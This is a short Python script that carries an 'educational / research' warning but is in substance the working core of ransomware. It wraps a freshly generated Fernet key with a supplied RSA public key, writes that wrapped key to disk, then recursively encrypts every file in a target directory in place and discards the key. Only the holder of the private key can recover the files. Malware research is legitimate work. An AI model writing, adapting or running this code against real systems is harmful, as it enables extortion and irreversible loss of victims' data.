# =======================================================
# WARNING: Educational / research code only.
# DO NOT RUN on production or persistent hosts. 
# Run only in an isolated disposable VM snapshot only for research/educational purposes.
# =======================================================

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.fernet import Fernet
from pathlib import Path
import sys

public_key_path = sys.argv[1]
encrypted_symmetric_key_path = sys.argv[2]
directory_path = sys.argv[3]

symmetric_key = Fernet.generate_key()
fernet = Fernet(symmetric_key)

# load public key for encryption of symmetric key
with open(public_key_path, 'rb') as file:
    public_key = serialization.load_pem_public_key(
        file.read(),
        backend=default_backend()
    )

# encrypt symmetric key used to encrypt files with a public key
with open(encrypted_symmetric_key_path, 'wb') as file:
    file.write(
        public_key.encrypt(
            symmetric_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    )

"""
recursively encrypt all files in a directory
and delete the instance with unencrypted symmetric key
"""
for item in Path(directory_path).rglob('*'):
    if item.is_file():
        with open(item, 'rb') as file:
            ciphertext = fernet.encrypt(
                file.read()
            )
        with open(item, 'wb') as file:
            file.write(ciphertext)
del fernet
